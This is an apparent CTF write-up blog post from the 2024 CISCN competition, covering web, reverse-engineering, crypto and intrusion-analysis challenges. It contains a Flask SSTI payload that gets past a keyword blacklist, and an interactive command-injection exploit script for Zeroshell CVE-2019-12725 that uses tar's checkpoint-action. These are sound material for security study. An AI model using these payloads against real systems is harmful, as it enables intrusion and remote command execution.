@@ -1,0 +1,844 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>2024-CISCN-XU17 | XU17</title>
+<link rel="shortcut icon" href="https://yzs17.github.io/favicon.ico?v=1734794530690">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://yzs17.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="2024-CISCN-XU17 | XU17 - Atom Feed" href="https://yzs17.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="Web
+Safe_proxy
+访问页面，得到源码如下
+from flask import Flask, request, render_template_string
+import socket
+import threading
+impor..." />
+    <meta name="keywords" content="CTF" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://yzs17.github.io">
+  <img class="avatar" src="https://yzs17.github.io/images/avatar.png?v=1734794530690" alt="">
+  </a>
+  <h1 class="site-title">
+    XU17
+  </h1>
+  <p class="site-description">
+    Follow the light but walk on the darkest path
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+        <a href="https://github.com/YZS17" target="_blank">
+          <i class="ri-github-line"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              2024-CISCN-XU17
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-12-16
+              </span>
+              <span>
+                24 min read
+              </span>
+              
+                <a href="https://yzs17.github.io/tag/CTF/" class="post-tag">
+                  # CTF
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://yzs17.github.io/post-images/2024ciscn-xu17.png" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="web">Web</h2>
+<h3 id="safe_proxy">Safe_proxy</h3>
+<p><mark>访问页面，得到源码如下</mark></p>
+<pre><code class="language-Python">from flask import Flask, request, render_template_string
+import socket
+import threading
+import html
+
+app = Flask(__name__)
+
+@app.route('/', methods=[&quot;GET&quot;])
+def source():
+    with open(__file__, 'r', encoding='utf-8') as f:
+        return '&lt;pre&gt;'+html.escape(f.read())+'&lt;/pre&gt;'
+
+@app.route('/', methods=[&quot;POST&quot;])
+def template():
+    template_code = request.form.get(&quot;code&quot;)
+    # 安全过滤
+    blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']
+    for black in blacklist:
+        if black in template_code:
+            return &quot;Forbidden content detected!&quot;
+    result = render_template_string(template_code)
+    print(result)
+    return 'ok' if result is not None else 'error'
+
+class HTTPProxyHandler:
+    def __init__(self, target_host, target_port):
+        self.target_host = target_host
+        self.target_port = target_port
+
+    def handle_request(self, client_socket):
+        try:
+            request_data = b&quot;&quot;
+            while True:
+                chunk = client_socket.recv(4096)
+                request_data += chunk
+                if len(chunk) &lt; 4096:
+                    break
+
+            if not request_data:
+                client_socket.close()
+                return
+
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as proxy_socket:
+                proxy_socket.connect((self.target_host, self.target_port))
+                proxy_socket.sendall(request_data)
+
+                response_data = b&quot;&quot;
+                while True:
+                    chunk = proxy_socket.recv(4096)
+                    if not chunk:
+                        break
+                    response_data += chunk
+
+            header_end = response_data.rfind(b&quot;\r\n\r\n&quot;)
+            if header_end != -1:
+                body = response_data[header_end + 4:]
+            else:
+                body = response_data
+                
+            response_body = body
+            response = b&quot;HTTP/1.1 200 OK\r\n&quot; \
+                       b&quot;Content-Length: &quot; + str(len(response_body)).encode() + b&quot;\r\n&quot; \
+                       b&quot;Content-Type: text/html; charset=utf-8\r\n&quot; \
+                       b&quot;\r\n&quot; + response_body
+
+            client_socket.sendall(response)
+        except Exception as e:
+            print(f&quot;Proxy Error: {e}&quot;)
+        finally:
+            client_socket.close()
+
+def start_proxy_server(host, port, target_host, target_port):
+    proxy_handler = HTTPProxyHandler(target_host, target_port)
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.bind((host, port))
+    server_socket.listen(100)
+    print(f&quot;Proxy server is running on {host}:{port} and forwarding to {target_host}:{target_port}...&quot;)
+
+    try:
+        while True:
+            client_socket, addr = server_socket.accept()
+            print(f&quot;Connection from {addr}&quot;)
+            thread = threading.Thread(target=proxy_handler.handle_request, args=(client_socket,))
+            thread.daemon = True
+            thread.start()
+    except KeyboardInterrupt:
+        print(&quot;Shutting down proxy server...&quot;)
+    finally:
+        server_socket.close()
+
+def run_flask_app():
+    app.run(debug=False, host='127.0.0.1', port=5000)
+
+if __name__ == &quot;__main__&quot;:
+    proxy_host = &quot;0.0.0.0&quot;
+    proxy_port = 5001
+    target_host = &quot;127.0.0.1&quot;
+    target_port = 5000
+
+    # 安全反代，防止针对响应头的攻击
+    proxy_thread = threading.Thread(target=start_proxy_server, args=(proxy_host, proxy_port, target_host, target_port))
+    proxy_thread.daemon = True
+    proxy_thread.start()
+
+    print(&quot;Starting Flask app...&quot;)
+    run_flask_app()
+</code></pre>
+<ul>
+<li><code>Flask-SSTI</code>，形式有点像强网杯一个题目</li>
+<li>把<code>flag</code>重定向到<code>app.py</code>上</li>
+<li>绕过<code>blacklist = ['__', 'import', 'os', 'sys', 'eval', 'subprocess', 'popen', 'system', '\r', '\n']</code></li>
+<li><code>__ -&gt; '_'+'_'</code></li>
+<li><code>os -&gt; 'o'+'s'</code></li>
+</ul>
+<p>最终<code>payload</code>如下</p>
+<pre><code class="language-Python">code={%set a='_'+'_'+'globals'+'_'+'_'%}{%set b='_'+'_'+'builtins'+'_'+'_'%}{%set c='_'+'_'+'impo''rt'+'_'+'_'%}{%set d='o'+'s'%}{{cycler.next[a][b][c](d)['pop''en']('cat ../../../flag &gt; app.py').read()}}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005154.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>回退</li>
+</ul>
+<figure data-type="image" tabindex="2"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162016073.png" alt="img" loading="lazy"></figure>
+<h2 id="reverse">Reverse</h2>
+<h3 id="ezcsky">ezCsky</h3>
+<ul>
+<li>固件分析，<code>Motorola RCE</code>架构，<code>ida7.7</code>里没有对应的<code>type</code>，一个个试找了一个反编译效果最好的</li>
+</ul>
+<figure data-type="image" tabindex="3"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005009.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>能识别出来的函数只有几个</li>
+</ul>
+<figure data-type="image" tabindex="4"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005972.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>
+<p>但是去翻翻看，能看到一个rc4_encrypt,cmp_result,main,大概能猜到意思</p>
+</li>
+<li>
+<p>在main里翻到了几个特征串，大概理清了流程</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="5"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005919.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>
+<p>用<code>“testkey”</code>进行<code>rc4</code>加密，在<code>cmp</code>中进行比较，密文在<code>unk_8AA0</code>里，往下面翻翻就能看到</p>
+</li>
+<li>
+<p>去网站解密后，发现还不太对</p>
+</li>
+</ul>
+<figure data-type="image" tabindex="6"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005966.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>发现最后一个是}，考虑还有个<code>xor</code>没用上，猜测是一个前后异或，回去读一读，大概对的上</li>
+</ul>
+<figure data-type="image" tabindex="7"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005016.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">flag{d0f5b330-9a74-11ef-9afd-acde48001122}
+</code></pre>
+<h2 id="crypto">Crypto</h2>
+<h3 id="rasnd">rasnd</h3>
+<ul>
+<li>第一部分 分析代码，得到如下关系</li>
+</ul>
+<pre><code>h1 = x1*p + y1 *q - 0x114
+h2 = x2*p +y2 * q - 0x514
+</code></pre>
+<ul>
+<li>消去<code>p</code>后，只需要爆破<code>h1、h2</code>即可</li>
+</ul>
+<pre><code class="language-Python">from Crypto.Util.number import *
+from gmpy2 import *
+from tqdm import *
+c = 2047025302632489558157986377411562383750242098507101091835107604805413439963651499324666753537268662411798999353368521616537455619541474396664247770819403320179057671372599818892198417715189001567277409117783983748271235004737860935969497729693964275961990646245389724322432112287310417469924363937852078540410479502868130356098508588355727424707732912060661787647639381326829675883881765220953147603356174168805562685038102366234920340464587909256209275021059297167327887262581448148603906439400710107536951684459877024176259067449629350804430963362618693698322831473282809815790044861282591070783004510688686543536
+n = 15920173700664937533872551211373259839660299468835236200963406447246081490116425338346880175793432609104986652164487679573546435542663593978091836423227699351391038307254973165725055211012599604697598457965776845260944492561088472287304875941686160337835563398666657256280956343977084300347919352519507817390748959649985567022862236579500096654959197540691900743410585789944175259198342315278161373891512170975014764014690048430767176042774918769605948250968099683007673337011895410534198101814351729062810555709406291719644174553645729624040667677828580430395394166441608908794433481917739937056295583112550096842829
+a = 1788191443423648314996962441836187430188972565635381393376017463408135062887872327752852694837772510240051857039862516257168171180534813011888460306819202855254313812259002208708003315009272616637706145101210351906671428324238878097469011217517290793242097541951393761641647697870262022422080159421238248852236227711616142536087708611893231058
+b = 4889435575009813953150459835380031496142967222940678447969658749487294768373783678917852904447599308535099664667524504039245726024439182695980458708722618855136931457891616586649484629257141009693449457099695131583806787115459724479919725740229105715779481332474441933271505987533267210176224331187382523048267185202782555789943574792505715301119230102640163860970042097004807825585559573355461122118412971402964101893600100934904032951444699944229492743037419616
+e = 0x10001
+
+for x1 in range(2**8,2**11):
+    for x2 in range(2**8,2**11):
+        k = (b+0x514)*x1 - (a+0x114)*x2
+        
+        if(gcd(k,n) &gt;1 &amp; gcd(k,n)&lt;n-1):
+            print(gcd(k,n))
+            q = gcd(k,n)
+
+q = 129713873839145334329392401371189963777712190897978816709235924556672196006347844671068464026219117804812297989197327919408459177096469030481019240080779880761097280806029355911233146512712582901895037850147815390703479188070631638892905175053709386715345561960074809966193484477155806599143328718289066817237
+p = n//q
+print(p)
+print(p*q ==n)
+
+phi = (p-1)*(q-1)
+print(phi)
+d = invert(e,phi)
+m= pow(c,d,n)
+print(long_to_bytes(m))
+</code></pre>
+<ul>
+<li>第二部分
+<ul>
+<li>分析得到：</li>
+</ul>
+</li>
+</ul>
+<pre><code>h = pow(514`*`p - 114`*`q, n - p - q, n) 
+</code></pre>
+<ul>
+<li>
+<p>由<code>pow(a,phi,n) = 1(a、n互素)</code>得<code>h = pow(514</code><em><code>p-114</code></em><code>q , -1 , n)</code></p>
+</li>
+<li>
+<p>求逆元，求出<code>514</code><em><code>p-114</code></em><code>q</code>后联立<code>n = p *q</code> 即可</p>
+</li>
+</ul>
+<pre><code class="language-Python">def extended_gcd(a, b):
+    if a == 0:
+        return b, 0, 1
+    gcd, x1, y1 = extended_gcd(b % a, a)
+    x = y1 - (b // a) * x1
+    y = x1
+    return gcd, x, y
+
+def mod_inverse(h, n):
+    gcd, a, _ = extended_gcd(h, n)
+    if gcd != 1:
+        raise ValueError(f&quot;{h} 和 {n} 不是互质的，无法计算逆元。&quot;)
+    else:
+        return a % n  
+
+
+h =   # 替换为实际的 h 值
+n =   # 替换为实际的 n 值
+
+try:
+    a = mod_inverse(h, n)
+    print(f&quot;满足 a * {h} ≡ 1 (mod {n}) 的 a 值为: {a}&quot;)
+except ValueError as e:
+    print(e)
+n =   # 替换为实际的 n 值
+h =   # 替换为实际的 h 值
+
+# 定义符号 p 和 q
+p, q = var('p q')
+
+eq1 = h == 514 * p - 114 * q
+eq2 = n == p * q
+
+solution = solve([eq1, eq2], p, q)
+
+solution
+from Crypto.Util.number import *
+from gmpy2 import *
+
+c = 
+n = 
+p = 
+q = 
+e = 0x10001
+phi = (p-1)*(q-1)
+print(phi)
+d = invert(e,phi)
+m= pow(c,d,n)
+print(long_to_bytes(m))
+</code></pre>
+<ul>
+<li>Flag:</li>
+</ul>
+<pre><code>flag{1b50dd42-e130-4aa1-af32-f0c228139ba9}
+</code></pre>
+<h3 id="fffffhash">Fffffhash</h3>
+<ul>
+<li>分析题目，一开始想构造格然后应用LLL求解，但一直没构造出来，然后写了个爆破的代码但要跑很久，最后搜索发现本题实际上是fnv算法的应用，去网上找了模板稍微改改，很快就写出来了</li>
+</ul>
+<pre><code class="language-Python">TARGET = 201431453607244229943761366749810895688
+h0 = 0x6c62272e07bb014262b821756295c58d
+p = 0x0000000001000000000000000000013b
+MOD = 2^128
+
+n = 16
+M = Matrix.column([p^(n - i - 1) for i in range(n)] + [-(TARGET - h0*p^n), MOD])
+M = M.augment(identity_matrix(n+1).stack(vector([0] * (n+1))))
+Q = Matrix.diagonal([2^256] + [2^4] * n + [2^8])
+M *= Q
+M = M.BKZ()
+M /= Q
+for r in M:
+    if r[0] == 0 and abs(r[-1]) == 1:
+        r *= r[-1]
+        #print(r)
+        good = r[1:-1]
+        print(good)
+        break
+
+inp = []
+y = int(h0*p)
+t = (h0*p^n + good[0] * p^(n-1)) % MOD
+for i in range(n):
+    for x in range(256):
+        y_ = (int(y) ^^ int(x)) * p^(n-i-1) % MOD
+        if y_ == t:
+            print('good', i, x)
+            inp.append(x)
+            if i &lt; n-1:
+                t = (t + good[i+1] * p^(n-i-2)) % MOD
+                y = ((int(y) ^^ int(x)) * p) % MOD
+            break
+    else:
+        print('bad', i)
+print(bytes(inp).hex())
+#020101081b04390001051a020a3d0f0f
+</code></pre>
+<ul>
+<li>不断调整n的取值，在n为16、23、29等时可以得到正解</li>
+</ul>
+<figure data-type="image" tabindex="8"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005522.png" alt="img" loading="lazy"></figure>
+<h2 id="威胁检测与恶意分析">威胁检测与恶意分析</h2>
+<h3 id="zeroshell_1">Zeroshell_1</h3>
+<ul>
+<li>流量包过滤<code>ip.dst==61.139.2.100&amp;&amp;http</code></li>
+<li>发现流量包</li>
+</ul>
+<figure data-type="image" tabindex="9"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005655.png" alt="img" loading="lazy"></figure>
+<p>进去发现一串字符</p>
+<figure data-type="image" tabindex="10"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162009224.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>一眼flag Base64结果，直接解密</li>
+</ul>
+<figure data-type="image" tabindex="11"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005166.png" alt="img" loading="lazy"></figure>
+<h3 id="zeroshell_2">Zeroshell_2</h3>
+<ul>
+<li>不多说，上面那个包一眼被打了执行命令</li>
+<li>吐槽自己一句，虚拟机卡了bug，卡了一两个小时，最后和队友换电脑一打就通，呜呜呜难受死了</li>
+<li>CVE-2019-12725</li>
+</ul>
+<figure data-type="image" tabindex="12"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162009124.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>这发包累死了，后面交互这做不下去呀，得写个EXP交互shell</li>
+<li>参照做强网杯第一道题exp结构</li>
+</ul>
+<pre><code class="language-Python">import requests
+from urllib.parse import quote
+import re
+
+while True:
+    cmd = input(&quot;cmd&gt; &quot;)  # 获取用户输入的命令
+
+    if cmd.lower() == 'exit':  # 如果输入exit，则退出循环
+        break
+
+    payload = &quot;cgi-bin/kerbynet?Action=x509view&amp;Section=NoAuthREQ&amp;User=&amp;x509type=%27%0A/etc/sudo%20tar%20-cf%20/dev/null%20/dev/null%20--checkpoint=1%20--checkpoint-action=exec=%27{cmd}%27%0A%27&quot;
+    encoded_cmd = quote(cmd)  # 对命令进行URL编码
+    # 假设有一个合法的URL基础部分，这里用YOUR_BASE_URL代替
+    base_url = &quot;http://61.139.2.100/&quot;
+    url = f&quot;{base_url}{payload.replace('{cmd}', encoded_cmd)}&quot;  # 构造完整的URL
+    # print(url)
+    try:
+        response = requests.get(url)  # 发送GET请求
+        # print(response.text)  # 打印响应内容
+
+        # 使用正则表达式删除特定的HTML内容
+        clean_text = re.sub(r'&lt;html&gt;.*?&lt;/html&gt;', '', response.text, flags=re.DOTALL)
+        print(clean_text)  # 打印清理后的响应内容
+
+    except requests.RequestException as e:
+        print(f&quot;请求失败：{e}&quot;)
+find / -name flag
+</code></pre>
+<figure data-type="image" tabindex="13"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162005130.png" alt="img" loading="lazy"></figure>
+<figure data-type="image" tabindex="14"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162009939.png" alt="img" loading="lazy"></figure>
+<ul>
+<li>俩flag一样的</li>
+</ul>
+<pre><code class="language-Python">flag{c6045425-6e6e-41d0-be09-95682a4f65c4}
+</code></pre>
+<h3 id="zeroshell_3">Zeroshell_3</h3>
+<ul>
+<li>这木马应该不是一直触发，过段时间出一次</li>
+<li>查看网络状态（得多试试，不一定抓到）</li>
+</ul>
+<pre><code class="language-Python">netstat -a
+</code></pre>
+<figure data-type="image" tabindex="15"><img src="https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202412162013244.png" alt="img" loading="lazy"></figure>
+<pre><code class="language-Python">cmd&gt; netstat -a
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State
+tcp        0      0 *:kerberos-adm          *:*                     LISTEN
+tcp        0      0 KDC.localdomain:domain  *:*                     LISTEN
+tcp        0      0 192.168.250.254:domain  *:*                     LISTEN
+tcp        0      0 61.139.2.100:domain     *:*                     LISTEN
+tcp        0      0 192.168.141.142:domain  *:*                     LISTEN
+tcp        0      0 localhost.locald:domain *:*                     LISTEN
+tcp        0      0 localhost.localdoma:953 *:*                     LISTEN
+tcp        0      0 localhost.localdom:ldap *:*                     LISTEN
+tcp        0      0 localhost.localdo:56914 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:43085      M.ROOT-SERVERS.N:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33171      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37965      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44065      b2.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37965      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:34095      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44065      b2.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47235      x.ns.se:domain          ESTABLISHED
+tcp        0      0 61.139.2.100:38275      M.ROOT-SERVERS.N:domain TIME_WAIT
+tcp        0      0 61.139.2.100:46061      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdo:56910 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:40409      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59067      c0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56920 ESTABLISHED
+tcp        0      0 61.139.2.100:56587      a0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:45133      l.root-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56918 ESTABLISHED
+tcp        0      0 61.139.2.100:45523      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 localhost.localdo:56912 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:40015      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44243      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50969      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:51223      M.ROOT-SERVERS.N:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33225      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35605      l.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:44243      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50969      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33225      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35583      l.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59151      z.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:57893      x.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:41387      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59799      l.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33915      a.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:49391      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:57407      j.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56914 ESTABLISHED
+tcp        0      0 61.139.2.100:48997      f.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:56033      x.ns.se:domain          TIME_WAIT
+tcp        0      0 localhost.localdo:56920 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:52587      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:41519      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56916 ESTABLISHED
+tcp        0      0 localhost.localdo:56916 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:43685      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:49173      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:58851      z.ns.se:domain          TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56910 ESTABLISHED
+tcp        0      0 61.139.2.100:39871      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:54571      c.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:34605      l.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:43537      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:46791      z.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:37013      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:46399      a2.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:55289      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39255      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47487      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:58451      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39255      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47487      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:58451      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:49089      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33023      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:46925      x.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:53227      h.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:60573      m.dns.it:domain         TIME_WAIT
+tcp        0      0 localhost.localdo:56918 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:34121      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:46849      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:51301      z.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:51213      d.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:33379      x.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:52391      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:37893      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39213      c.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:36225      d.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:52841      l.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:56189      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:50629      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:43567      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:36957      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47391      d.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35085      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:42349      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:47627      e.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:34175      A0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:35877      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:40979      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:49659      c.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:49507      m.dns.it:domain         TIME_WAIT
+tcp        0      0 61.139.2.100:57829      D0.INFO.AFILIAS-:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37275      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59037      h.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56922 ESTABLISHED
+tcp        0      0 61.139.2.100:56535      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 localhost.localdo:56928 localhost.localdom:ldap TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56908 ESTABLISHED
+tcp        0      0 61.139.2.100:47253      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50011      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:47907      192.112.36.4:domain     TIME_WAIT
+tcp        0      1 61.139.2.100:39386      202.115.89.103:http-alt SYN_SENT
+tcp        0      0 61.139.2.100:45417      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:49667      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:45737      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:43643      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:37993      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:37993      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:47981      y.ns.se:domain          TIME_WAIT
+tcp        0      0 61.139.2.100:41227      i.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:33447      ns-w.ant.isi.edu:domain TIME_WAIT
+tcp        0      0 61.139.2.100:58111      c0.org.afilias-n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59913      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:53117      a.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:48453      j.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:58467      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 61.139.2.100:50803      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:56599      a.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:59077      c.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:48575      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 localhost.localdom:ldap localhost.localdo:56912 ESTABLISHED
+tcp        0      0 61.139.2.100:55893      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:51429      k.root-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:39265      i.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:38027      d.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:60927      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:39375      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 localhost.localdo:56922 localhost.localdom:ldap ESTABLISHED
+tcp        0      0 61.139.2.100:56211      192.112.36.4:domain     TIME_WAIT
+tcp        0      0 61.139.2.100:50853      dns2.edu.cn:domain      TIME_WAIT
+tcp        0      0 61.139.2.100:42793      c.gtld-servers.n:domain TIME_WAIT
+tcp        0      0 61.139.2.100:48795      b-2004.b.root-se:domain TIME_WAIT
+tcp        0      0 *:www-http              *:*                     LISTEN
+tcp        0      0 *:domain                *:*                     LISTEN
